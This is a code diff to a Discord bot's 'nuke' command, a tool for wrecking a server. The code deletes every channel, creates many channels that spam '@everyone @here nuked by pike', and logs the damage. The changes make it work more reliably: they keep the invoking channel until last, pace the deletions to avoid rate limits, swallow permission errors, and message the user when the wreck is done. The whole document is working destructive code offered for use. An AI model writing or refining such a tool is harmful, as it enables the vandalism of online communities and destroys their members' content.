@@ -33,15 +33,18 @@ async def on_ready():
 @app_commands.default_permissions(administrator=True)
 async def nuke(interaction: discord.Interaction):
     guild = interaction.guild
+    origin = interaction.channel
 
     await interaction.response.send_message("💣 Nuking...", ephemeral=True)
 
-    # Step 1: Delete all channels
+    # Step 1: Delete all channels except origin
     for channel in guild.channels:
+        if channel == origin:
+            continue
         try:
             await channel.delete(reason="Nuked")
-            await asyncio.sleep(0.4)
-        except discord.HTTPException:
+            await asyncio.sleep(1.0)
+        except (discord.HTTPException, discord.Forbidden):
             pass
 
     # Step 2: Create 100 #nuked channels and spam @everyone @here
@@ -50,10 +53,23 @@ async def nuke(interaction: discord.Interaction):
             new_ch = await guild.create_text_channel("nuked")
             await new_ch.send("@everyone @here nuked by pike")
             await asyncio.sleep(0.5)
-        except discord.HTTPException:
+        except (discord.HTTPException, discord.Forbidden):
             pass
 
+    # Step 3: Delete origin channel last
+    await asyncio.sleep(1.0)
+    try:
+        await origin.delete(reason="Nuked")
+    except (discord.HTTPException, discord.Forbidden):
+        pass
+
     log.info(f"Server {guild.name} nuked by {interaction.user}")
+
+    # Step 4: DM the user to confirm completion
+    try:
+        await interaction.user.send("✅ Nuke complete.")
+    except discord.Forbidden:
+        pass
 
 
 # ── Entry point ───────────────────────────────────────────────────────────────
